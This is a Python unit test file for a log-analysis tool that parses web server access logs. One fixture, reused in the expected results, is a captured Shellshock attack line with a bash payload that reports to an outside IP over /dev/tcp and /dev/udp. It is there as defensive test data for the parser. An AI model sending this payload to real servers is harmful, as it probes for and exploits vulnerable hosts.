#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# logalyzer:
# Parses your bloated HTTP access logs to extract the info you want
# about hits to your webserver from (hopefully) real people instead of
# just the endless hackers and bots. Stores the info in a relational
# database where you can access it using all the power of SQL.
#
# Copyright (C) 2015, 2017, 2018 by Edwin A. Suominen,
# http://edsuom.com/logalyzer
#
# See edsuom.com for API documentation as well as information about
# Ed's background and other projects, software and otherwise.
# 
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the
# License. You may obtain a copy of the License at
# 
#   http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an "AS
# IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
# express or implied. See the License for the specific language
# governing permissions and limitations under the License.

import os.path
from datetime import datetime as dt

from twisted.python import failure
from twisted.internet import defer

from testbase import TestCase
import parse


ip1 = "221.127.9.141"
ip2 = "82.132.214.244"

OLD_STYLE = """
2015-02-20 05:57:24+0000 [HTTPChannel,1102,173.252.120.113] 173.252.120.113 tellectual.com - [20/Feb/2015:05:57:23 +0000] "GET /ME-640px.jpg HTTP/1.1" 200 756204 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
"""

NEW_STYLE = """
2015-06-28 08:13:39+0000 [-] 173.252.74.112 edsuom.com - [28/Jun/2015:08:13:39 +0000] "GET /pics/Sacrifice_of_Isaac-Caravaggio-640px.jpg HTTP/1.1" 200 161670 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
"""

NEWER_STYLE = """
2017-12-08T15:43:31+0000 [twisted.python.log#info] 77.75.78.166 examinationofthepearl.org - [08/Dec/2017:15:43:30 +0000] "GET /robots.txt HTTP/1.1" 200 105 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
"""

NASTY_SHIT = """
2015-02-26 20:00:24+0000 [HTTPChannel,3229,68.116.30.102] 68.116.30.102 EVOLVINGOUTOFEDEN.ORG - [26/Feb/2015:20:00:24 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 234 "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"" "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"
"""

TWISTED_MSG = """
2015-04-02 20:07:41+0000 [HTTPChannel,28192,216.99.158.78] Warning: HEAD request <HEAD /fckeditor/editor HTTP/1.1> for resource <twisted.web.resource.NoResource instance at 0x146fe18> is returning a message body.  I think I'll eat it.
"""

ANOTHER_TWISTED_MSG = """
2015-02-18 03:21:45+0000 [-] Starting factory <twisted.web.server.Site instance at 0x28408c0>
"""


class TestRedirectChecker(TestCase):
    def setUp(self):
        self.rc = parse.RedirectChecker()

    def test_isRedirect(self):
        wasRD, vhost = self.rc("foo.com", ip1, 200)
        self.assertFalse(wasRD)
        self.assertEqual(vhost, "foo.com")
        wasRD, vhost = self.rc("foo.com", ip2, 302)
        self.assertFalse(wasRD)
        self.assertEqual(vhost, "foo.com")
        for k in xrange(10):
            wasRD, vhost = self.rc("bar.com", ip2, 200)
            self.assertTrue(wasRD)
            self.assertEqual(vhost, "foo.com")
        wasRD, vhost = self.rc("bar.com", ip1, 200)
        self.assertFalse(wasRD)
        self.assertEqual(vhost, "bar.com")


class TestParser(TestCase):
    def setUp(self):
        self.p = parse.LineParser()
        self.ipList = []

    def test_parseDatetimeBlock(self):
        textExpected = (
            ("20/Feb/2015:12:02:49 +0000", dt(2015, 2, 20, 12, 2, 49)),
            ("2/Jan/2015:21:17:16 +0000", dt(2015, 1, 2, 21, 17, 16)),
            ("07/Sep/2014:06:46:34 -0400", dt(2014, 9, 7, 6, 46, 34)))
        for text, dtExpected in textExpected:
            self.failUnlessEqual(self.p.parseDatetimeBlock(text), dtExpected)
            
    def test_call(self):
        textExpected = (
            ('64.233.172.98 freedomtodoubt.com - [07/Sep/2014:06:46:34 -0400] '+\
             '"GET /ftd.css HTTP/1.1" 200 1238 "http://freedomtodoubt.com/" '+\
             '"Mozilla/5.0 (Linux; U; Android 4.3; en-us; SPH-L710 Build/JSS15J) '+\
             'AppleWebKit/534.30 (KHTML, like Gecko) '+\
             'Version/4.0 Mobile Safari/534.30"',
             ["freedomtodoubt.com",
              "64.233.172.98",
              dt(2014, 9, 7, 6, 46, 34),
              "/ftd.css",
              200,
              "http://freedomtodoubt.com/",
              "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SPH-L710 Build/JSS15J) "+\
              "AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile " +\
              "Safari/534.30"]),
            (NASTY_SHIT,
             ["evolvingoutofeden.org",
              "68.116.30.102",
              dt(2015, 02, 26, 20, 0, 24),
              "/cgi-bin/test-cgi",
              302,
              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
              "test-cgi > /dev/udp/23.227.199.185/80\"",
              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
              "test-cgi > /dev/udp/23.227.199.185/80"]),
            (OLD_STYLE,
             ["tellectual.com",
              "173.252.120.113",
              dt(2015, 2, 20, 5, 57, 24),
              "/ME-640px.jpg",
              200,
              "-",
              "facebookexternalhit/1.1 "+\
              "(+http://www.facebook.com/externalhit_uatext.php)"]),
            (NEW_STYLE,
             ["edsuom.com",
              "173.252.74.112",
              dt(2015, 6, 28, 8, 13, 39),
              "/pics/Sacrifice_of_Isaac-Caravaggio-640px.jpg",
              200,
              "-",
              "facebookexternalhit/1.1 "+\
              "(+http://www.facebook.com/externalhit_uatext.php)"]),
            (NEWER_STYLE,
             ["examinationofthepearl.org",
              "77.75.78.166",
              dt(2017, 12, 8, 15, 43, 31),
              "/robots.txt",
              200,
              "-",
              "Mozilla/5.0 (compatible; SeznamBot/3.2; "+\
              "+http://napoveda.seznam.cz/en/seznambot-intro/)"]),
        )
        for text, expected in textExpected:
            text = text.strip()
            result = self.p(text)
            self.assertNotNone(result, "Did not parse '{}'".format(text))
            self.assertItemsEqual(result, expected)

    def test_call_nastyShit(self):
        for k in xrange(3):
            dtp = self.p(NASTY_SHIT.strip())[2]
            self.assertEqual(dtp, dt(2015, 02, 26, 20, 0, 24))

    def test_call_bogus(self):
        self.assertNone(self.p("xxxx"))
        self.assertNone(self.p(TWISTED_MSG.strip()))
        self.assertNone(self.p(ANOTHER_TWISTED_MSG.strip()))
